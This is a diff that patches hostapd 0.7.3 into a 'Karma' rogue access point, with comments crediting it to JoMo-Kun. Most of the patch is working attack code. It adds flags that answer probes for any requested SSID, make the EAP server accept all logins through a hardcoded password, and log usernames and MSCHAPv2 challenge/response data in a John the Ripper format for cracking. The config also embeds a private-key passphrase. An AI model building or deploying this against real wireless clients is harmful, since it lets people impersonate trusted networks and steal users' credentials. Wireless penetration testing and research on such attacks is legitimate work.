@@ -1,0 +1,481 @@
+diff -urN hostapd-0.7.3.orig/hostapd/Makefile hostapd-0.7.3/hostapd/Makefile
+--- hostapd-0.7.3.orig/hostapd/Makefile	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/hostapd/Makefile	2011-05-02 15:59:46.787000009 +0800
+@@ -3,7 +3,7 @@
+ endif
+ 
+ ifndef CFLAGS
+-CFLAGS = -MMD -O2 -Wall -g
++CFLAGS = -MMD -O2 -Wall -DDEBUG -g -pg
+ endif
+ 
+ CFLAGS += -I../src
+@@ -84,6 +84,7 @@
+ 
+ OBJS += ../src/eapol_auth/eapol_auth_sm.o
+ 
++OBJS += ../src/karma/karma.o
+ 
+ ifndef CONFIG_NO_DUMP_STATE
+ # define HOSTAPD_DUMP_STATE to include SIGUSR1 handler for dumping state to
+diff -urN hostapd-0.7.3.orig/hostapd/hostapd.conf hostapd-0.7.3/hostapd/hostapd.conf
+--- hostapd-0.7.3.orig/hostapd/hostapd.conf	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/hostapd/hostapd.conf	2011-05-02 15:59:46.788000008 +0800
+@@ -3,7 +3,7 @@
+ 
+ # AP netdevice name (without 'ap' postfix, i.e., wlan0 uses wlan0ap for
+ # management frames); ath0 for madwifi
+-interface=wlan0
++interface=wlan1
+ 
+ # In case of madwifi, atheros, and nl80211 driver interfaces, an additional
+ # configuration parameter, bridge, may be used to notify hostapd if the
+@@ -23,6 +23,7 @@
+ # Use driver=none if building hostapd as a standalone RADIUS server that does
+ # not control any wireless/wired driver.
+ # driver=hostap
++driver=nl80211
+ 
+ # hostapd event logger configuration
+ #
+@@ -88,7 +89,7 @@
+ # Country code (ISO/IEC 3166-1). Used to set regulatory domain.
+ # Set as needed to indicate country in which device is operating.
+ # This can limit available channels and transmit power.
+-#country_code=US
++country_code=US
+ 
+ # Enable IEEE 802.11d. This advertises the country_code and the set of allowed
+ # channels and transmit power levels based on the regulatory limits. The
+@@ -99,14 +100,14 @@
+ 
+ # Operation mode (a = IEEE 802.11a, b = IEEE 802.11b, g = IEEE 802.11g,
+ # Default: IEEE 802.11b
+-hw_mode=a
++hw_mode=b
+ 
+ # Channel number (IEEE 802.11)
+ # (default: 0, i.e., not set)
+ # Please note that some drivers (e.g., madwifi) do not use this value from
+ # hostapd and the channel will need to be configuration separately with
+ # iwconfig.
+-channel=60
++channel=1
+ 
+ # Beacon interval in kus (1.024 ms) (default: 100; range 15..65535)
+ beacon_int=100
+@@ -410,7 +411,7 @@
+ ##### IEEE 802.1X-2004 related configuration ##################################
+ 
+ # Require IEEE 802.1X authorization
+-#ieee8021x=1
++ieee8021x=1
+ 
+ # IEEE 802.1X/EAPOL version
+ # hostapd is implemented based on IEEE Std 802.1X-2004 which defines EAPOL
+@@ -418,7 +419,7 @@
+ # the new version number correctly (they seem to drop the frames completely).
+ # In order to make hostapd interoperate with these clients, the version number
+ # can be set to the older version (1) with this configuration value.
+-#eapol_version=2
++eapol_version=1
+ 
+ # Optional displayable message sent with EAP Request-Identity. The first \0
+ # in this string will be converted to ASCII-0 (nul). This can be used to
+@@ -460,16 +461,18 @@
+ # Use integrated EAP server instead of external RADIUS authentication
+ # server. This is also needed if hostapd is configured to act as a RADIUS
+ # authentication server.
+-eap_server=0
++eap_server=1
+ 
+ # Path for EAP server user database
+ #eap_user_file=/etc/hostapd.eap_user
+ 
+ # CA certificate (PEM or DER file) for EAP-TLS/PEAP/TTLS
+ #ca_cert=/etc/hostapd.ca.pem
++ca_cert=/etc/hostapd/sf_bundle.pem
+ 
+ # Server certificate (PEM or DER file) for EAP-TLS/PEAP/TTLS
+ #server_cert=/etc/hostapd.server.pem
++server_cert=/etc/hostapd/INTRANET.pem
+ 
+ # Private key matching with the server certificate for EAP-TLS/PEAP/TTLS
+ # This may point to the same file as server_cert if both certificate and key
+@@ -477,9 +480,11 @@
+ # used by commenting out server_cert and specifying the PFX file as the
+ # private_key.
+ #private_key=/etc/hostapd.server.prv
++private_key=/etc/hostapd/INTRANET.pem
+ 
+ # Passphrase for private key
+ #private_key_passwd=secret passphrase
++private_key_passwd=Cricket8
+ 
+ # Enable CRL verification.
+ # Note: hostapd does not yet support CRL downloading based on CDP. Thus, a
+@@ -674,6 +679,7 @@
+ # bit0 = WPA
+ # bit1 = IEEE 802.11i/RSN (WPA2) (dot11RSNAEnabled)
+ #wpa=1
++wpa=3
+ 
+ # WPA pre-shared keys for WPA-PSK. This can be either entered as a 256-bit
+ # secret in hex format (64 hex digits), wpa_psk, or as an ASCII passphrase
+@@ -695,6 +701,7 @@
+ # added to enable SHA256-based stronger algorithms.
+ # (dot11RSNAConfigAuthenticationSuitesTable)
+ #wpa_key_mgmt=WPA-PSK WPA-EAP
++wpa_key_mgmt=WPA-EAP
+ 
+ # Set of accepted cipher suites (encryption algorithms) for pairwise keys
+ # (unicast packets). This is a space separated list of algorithms:
+diff -urN hostapd-0.7.3.orig/hostapd/main.c hostapd-0.7.3/hostapd/main.c
+--- hostapd-0.7.3.orig/hostapd/main.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/hostapd/main.c	2011-05-02 16:01:06.320000003 +0800
+@@ -36,6 +36,10 @@
+ extern int wpa_debug_show_keys;
+ extern int wpa_debug_timestamp;
+ 
++/* Karma Mode */
++#include "karma/karma.h"
++int karma_beacon_respond = 0;
++int karma_eap_auth = 0;
+ 
+ struct hapd_interfaces {
+ 	size_t count;
+@@ -458,7 +462,7 @@
+ 	show_version();
+ 	fprintf(stderr,
+ 		"\n"
+-		"usage: hostapd [-hdBKtv] [-P <PID file>] "
++		"usage: hostapd [-hdBKtvRA] [-P <PID file>] "
+ 		"<configuration file(s)>\n"
+ 		"\n"
+ 		"options:\n"
+@@ -468,7 +472,9 @@
+ 		"   -P   PID file\n"
+ 		"   -K   include key data in debug messages\n"
+ 		"   -t   include timestamps in some debug messages\n"
+-		"   -v   show hostapd version\n");
++		"   -v   show hostapd version\n"
++        "   -R   [karma] respond to all probes using requested SSID\n" 
++        "   -A   [karma] enable authentication attempt logging\n"); 
+ 
+ 	exit(1);
+ }
+@@ -486,7 +492,7 @@
+ 		return -1;
+ 
+ 	for (;;) {
+-		c = getopt(argc, argv, "BdhKP:tv");
++		c = getopt(argc, argv, "BdhKP:tvRA");
+ 		if (c < 0)
+ 			break;
+ 		switch (c) {
+@@ -511,6 +517,12 @@
+ 		case 't':
+ 			wpa_debug_timestamp++;
+ 			break;
++        case 'R':                                                                                                                                                                                                                 
++            karma_beacon_respond++;                                                                                                                                                                                               
++            break;                                                                                                                                                                                                                
++        case 'A':                                                                                                                                                                                                                 
++            karma_eap_auth++;                                                                                                                                                                                                     
++            break;
+ 		case 'v':
+ 			show_version();
+ 			exit(1);
+diff -urN hostapd-0.7.3.orig/src/ap/beacon.c hostapd-0.7.3/src/ap/beacon.c
+--- hostapd-0.7.3.orig/src/ap/beacon.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/ap/beacon.c	2011-05-02 15:59:46.789000006 +0800
+@@ -14,6 +14,11 @@
+  * See README and COPYING for more details.
+  */
+ 
++#define _GNU_SOURCE
++#include <stdio.h>
++
++#include "karma/karma.h"
++
+ #include "utils/includes.h"
+ 
+ #ifndef CONFIG_NATIVE_WINDOWS
+@@ -250,7 +255,24 @@
+ 		if (sta)
+ 			sta->ssid_probe = &hapd->conf->ssid;
+ 	}
+-
++  /* Karma Promiscuous Beacon Response Hack - JoMo-Kun <jmk@foofus.net> */
++  else if (karma_beacon_respond) {
++          char ssid_txt[33];
++    char *message = NULL;
++
++                ieee802_11_print_ssid(ssid_txt, elems.ssid, elems.ssid_len);
++
++    if (asprintf(&message, "Probe request from " MACSTR " for SSID '%s'", MAC2STR(mgmt->sa), ssid_txt) < 0)
++      wpa_printf(MSG_ERROR, "Error allocating memory for Karma message\n");
++
++    karma_logger(0, message);
++    free(message);
++
++    ssid = (char *)elems.ssid;
++    ssid_len = elems.ssid_len;
++                //if (sta)
++                //      sta->ssid_probe = &elems.ssid;
++  }
+ 	if (!ssid) {
+ 		if (!(mgmt->da[0] & 0x01)) {
+ 			char ssid_txt[33];
+diff -urN hostapd-0.7.3.orig/src/ap/hostapd.c hostapd-0.7.3/src/ap/hostapd.c
+--- hostapd-0.7.3.orig/src/ap/hostapd.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/ap/hostapd.c	2011-05-02 15:59:46.789000006 +0800
+@@ -12,6 +12,8 @@
+  * See README and COPYING for more details.
+  */
+ 
++#include "karma/karma.h"
++
+ #include "utils/includes.h"
+ 
+ #include "utils/common.h"
+diff -urN hostapd-0.7.3.orig/src/ap/ieee802_11.c hostapd-0.7.3/src/ap/ieee802_11.c
+--- hostapd-0.7.3.orig/src/ap/ieee802_11.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/ap/ieee802_11.c	2011-05-02 15:59:46.790000004 +0800
+@@ -12,6 +12,8 @@
+  * See README and COPYING for more details.
+  */
+ 
++#include "karma/karma.h"
++
+ #include "utils/includes.h"
+ 
+ #ifndef CONFIG_NATIVE_WINDOWS
+@@ -533,8 +535,9 @@
+ 	if (ssid_ie == NULL)
+ 		return WLAN_STATUS_UNSPECIFIED_FAILURE;
+ 
+-	if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
+-	    os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
++    /* Karma Promiscuous Beacon Response Hack - JoMo-Kun <jmk@foofus.net> */ 
++    if ((!karma_beacon_respond) && (ssid_ie_len != hapd->conf->ssid.ssid_len ||
++	    os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0)) {
+ 		char ssid_txt[33];
+ 		ieee802_11_print_ssid(ssid_txt, ssid_ie, ssid_ie_len);
+ 		hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
+diff -urN hostapd-0.7.3.orig/src/eap_server/eap_server.c hostapd-0.7.3/src/eap_server/eap_server.c
+--- hostapd-0.7.3.orig/src/eap_server/eap_server.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/eap_server/eap_server.c	2011-05-02 15:59:46.791000002 +0800
+@@ -18,6 +18,11 @@
+  * backend_auth configuration variable to TRUE.
+  */
+ 
++#define _GNU_SOURCE                                                                                                                                                                                                               
++#include <stdio.h> 
++
++#include "karma/karma.h"
++
+ #include "includes.h"
+ 
+ #include "common.h"
+@@ -99,24 +104,51 @@
+ int eap_user_get(struct eap_sm *sm, const u8 *identity, size_t identity_len,
+ 		 int phase2)
+ {
+-	struct eap_user *user;
+-
+-	if (sm == NULL || sm->eapol_cb == NULL ||
+-	    sm->eapol_cb->get_eap_user == NULL)
+-		return -1;
+-
+-	eap_user_free(sm->user);
++  struct eap_user *user;
++  char *username = NULL;
++  char *message = NULL;
++	
++  eap_user_free(sm->user);
+ 	sm->user = NULL;
+ 
+-	user = os_zalloc(sizeof(*user));
+-	if (user == NULL)
+-	    return -1;
++  user = os_zalloc(sizeof(*user));
++  if (user == NULL)
++    return -1;
++
++  /* Karma Mode: Accept all requests, regardless of username - JoMo-Kun <jmk@foofus.net> */
++  if (karma_eap_auth)
++  {
++    user->methods[0].vendor = sm->respVendor;
++    user->password = os_zalloc(9);
++    strncpy((char *)user->password, "Cricket8", 8); /* Magic password allows successful authentication */
++    user->password_len = 8;
++
++    if (phase2)
++      user->methods[0].method = EAP_TYPE_MSCHAPV2;
++    else // TODO: what happens if we propose LEAP?
++      user->methods[0].method = EAP_TYPE_PEAP;
++
++    username = os_zalloc(sm->identity_len + 1);
++    strncpy(username, (char *)sm->identity, (size_t)sm->identity_len);
++ 
++    if (asprintf(&message, "Authentication Request - Username: %s Vendor: %d Method: %d", username, sm->respVendor, sm->respVendorMethod) < 0)
++      printf("Error allocating memory for request message.\n");
++
++    karma_logger(0, message);
++    free(message);
++  }
++  else
++  {
++	  if (sm == NULL || sm->eapol_cb == NULL ||
++	    sm->eapol_cb->get_eap_user == NULL)
++  		return -1;
+ 
+-	if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity,
+-				       identity_len, phase2, user) != 0) {
+-		eap_user_free(user);
+-		return -1;
+-	}
++	  if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity,
++		  		       identity_len, phase2, user) != 0) {
++		  eap_user_free(user);
++		  return -1;
++  	}
++  }
+ 
+ 	sm->user = user;
+ 	sm->user_eap_method_index = 0;
+diff -urN hostapd-0.7.3.orig/src/eap_server/eap_server_mschapv2.c hostapd-0.7.3/src/eap_server/eap_server_mschapv2.c
+--- hostapd-0.7.3.orig/src/eap_server/eap_server_mschapv2.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/eap_server/eap_server_mschapv2.c	2011-05-02 15:59:46.792000002 +0800
+@@ -12,6 +12,8 @@
+  * See README and COPYING for more details.
+  */
+ 
++#include "karma/karma.h"
++
+ #include "includes.h"
+ 
+ #include "common.h"
+@@ -289,13 +291,15 @@
+ 					  struct wpabuf *respData)
+ {
+ 	struct eap_mschapv2_hdr *resp;
+-	const u8 *pos, *end, *peer_challenge, *nt_response, *name;
++	const u8 *pos, *end, *auth_challenge, *peer_challenge, *nt_response, *name;
+ 	u8 flags;
+ 	size_t len, name_len, i;
+ 	u8 expected[24];
+ 	const u8 *username, *user;
+ 	size_t username_len, user_len;
+ 	int res;
++    char *auth_creds = NULL;
++    int auth_creds_len = 0;
+ 
+ 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
+ 			       &len);
+@@ -335,6 +339,38 @@
+ 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
+ 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
+ 
++  /* Karma Mode: Log MSCHAPv2 exchange in John format - JoMo-Kun <jmk@foofus.net> */
++  /* user::domain (unused):authenticator challenge:mschapv2 response:peer challenge */
++  if (karma_eap_auth)
++  { 
++    auth_creds_len = sm->identity_len + 3 + 16*2 + 1 + 24*2 + 1 + 16*2;
++    auth_creds = os_malloc(auth_creds_len + 1);
++    memset(auth_creds, 0, auth_creds_len + 1);
++ 
++    strncpy(auth_creds, (char *)sm->identity, sm->identity_len); 
++    sprintf(auth_creds + sm->identity_len, ":::");
++
++    /* Authenticator Challenge */
++    auth_challenge = data->auth_challenge;
++    for (i=0; i<16; i++)
++      sprintf(auth_creds + sm->identity_len + 3 + 2*i, "%2.2X", 0xFF & (int)auth_challenge[i]); 
++  
++    sprintf(auth_creds + sm->identity_len + 3 + 16*2, ":");
++
++    /* MSCHAPv2 Response */
++    for (i=0; i<24; i++)
++      sprintf(auth_creds + sm->identity_len + 3 + 16*2 + 1 + 2*i, "%2.2X", 0xFF & (int)nt_response[i]); 
++
++    sprintf(auth_creds + sm->identity_len + 3 + 16*2 + 1 + 24*2, ":");
++  
++    /* Peer Challenge */ 
++    for (i=0; i<16; i++)
++      sprintf(auth_creds + sm->identity_len + 3 + 16*2 + 1 + 24*2 + 1 + 2*i, "%2.2X", 0xFF & (int)peer_challenge[i]); 
++ 
++    karma_logger(1, auth_creds);
++    free(auth_creds);
++  }
++
+ 	/* MSCHAPv2 does not include optional domain name in the
+ 	 * challenge-response calculation, so remove domain prefix
+ 	 * (if present). */
+diff -urN hostapd-0.7.3.orig/src/karma/karma.c hostapd-0.7.3/src/karma/karma.c
+--- hostapd-0.7.3.orig/src/karma/karma.c	1970-01-01 07:30:00.000000000 +0730
++++ hostapd-0.7.3/src/karma/karma.c	2011-05-02 15:59:46.792000002 +0800
+@@ -0,0 +1,43 @@
++#define _GNU_SOURCE
++#include <stdio.h>
++
++#include "common.h"
++#include "includes.h"
++#include "trace.h"                                                                                                                                                       
++
++#include "karma/karma.h"
++
++/* Karma Mode: Log data related to MSCHAPv2 challenge/response authentication attempts */
++extern void karma_logger(int type, char *message)
++{
++    FILE *logfd;
++    time_t cur_time;
++    struct tm *tm_ptr;
++    char time_buf[256];                                                                                                                                                     
++    /* General: probe requests, username requests */
++    logfd = fopen("./hostapd-karma.txt", "a");
++    if (logfd == NULL) {
++        fprintf(stderr, "[karma] Failed to open log file: ./hostapd-karma.txt\n");
++        logfd = stderr;
++    }
++
++    cur_time = time(NULL);
++    (void) time(&cur_time);
++    tm_ptr = localtime(&cur_time);
++    strftime(time_buf, 256, "%Y-%m-%d %H:%M:%S", tm_ptr);
++    fprintf(logfd, "%s:%s\n", time_buf, message);
++    fprintf(stderr, "[karma] %s:%s\n", time_buf, message);
++    fclose(logfd);
++    
++    /* MSCHAPv2 Challenge/Response */
++    if (type == 1)
++    {
++        logfd = fopen("./hostapd-karma.lc", "a");
++        if (logfd == NULL) {
++            fprintf(stderr, "[karma] Failed to open log file: ./hostapd-karma.lc\n");
++            logfd = stderr;
++        }
++        fprintf(logfd, "%s\n", message);
++        fclose(logfd);
++    }
++}
+diff -urN hostapd-0.7.3.orig/src/karma/karma.h hostapd-0.7.3/src/karma/karma.h
+--- hostapd-0.7.3.orig/src/karma/karma.h	1970-01-01 07:30:00.000000000 +0730
++++ hostapd-0.7.3/src/karma/karma.h	2011-05-02 15:59:46.792000002 +0800
+@@ -0,0 +1,3 @@
++extern int karma_beacon_respond;
++extern int karma_eap_auth;                                                                                                                                                                                                       
++extern void karma_logger(int, char*);
+diff -urN hostapd-0.7.3.orig/src/utils/wpa_debug.c hostapd-0.7.3/src/utils/wpa_debug.c
+--- hostapd-0.7.3.orig/src/utils/wpa_debug.c	2010-09-07 23:43:39.000000000 +0800
++++ hostapd-0.7.3/src/utils/wpa_debug.c	2011-05-02 15:59:46.793000003 +0800
+@@ -22,6 +22,8 @@
+ static int wpa_debug_syslog = 0;
+ #endif /* CONFIG_DEBUG_SYSLOG */
+ 
++/* Karma Mode */                                                                                                                                                                                                                  
++#include "karma/karma.h"
+ 
+ #ifdef CONFIG_DEBUG_FILE
+ static FILE *out_file = NULL;
